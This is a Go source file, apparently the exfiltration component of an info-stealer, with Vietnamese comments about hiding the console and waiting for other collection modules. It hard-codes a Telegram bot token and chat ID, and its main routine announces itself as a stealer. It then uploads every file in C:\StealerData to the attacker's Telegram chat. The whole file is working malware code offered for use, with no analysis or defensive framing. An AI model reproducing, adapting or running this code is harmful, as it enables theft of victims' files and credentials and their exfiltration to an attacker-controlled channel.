// bot.go - Go Telegram Bot (Ẩn console)
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	Token  = "8344961429:AAEg71PXgEOFB-9kVGBFHm8tXFPvw8MHv0A"
	ChatID = "8516763046"
)

func sendMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", Token)
	data := map[string]string{"chat_id": ChatID, "text": text}
	jsonData, _ := json.Marshal(data)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func sendFile(filePath, caption string) {
	file, _ := os.Open(filePath)
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.WriteField("chat_id", ChatID)
	writer.WriteField("caption", caption)
	part, _ := writer.CreateFormFile("document", filepath.Base(filePath))
	io.Copy(part, file)
	writer.Close()

	http.Post("https://api.telegram.org/bot"+Token+"/sendDocument", writer.FormDataContentType(), body)
}

func sendDirectory(dirPath string) {
	sendMessage("📦 Sending collected data from " + dirPath + "...")
	files, _ := os.ReadDir(dirPath)
	for _, f := range files {
		if !f.IsDir() {
			fullPath := filepath.Join(dirPath, f.Name())
			sendFile(fullPath, "📄 "+f.Name())
			time.Sleep(800 * time.Millisecond)
		}
	}
	sendMessage("✅ All data sent successfully!")
}

func main() {
	sendMessage("🚀 Stealer Bot Started - Collecting & Exfiltrating...")

	time.Sleep(25 * time.Second) // Đợi các module khác thu thập xong

	sendDirectory(`C:\StealerData`)

	sendMessage("🎯 All modules completed!")
}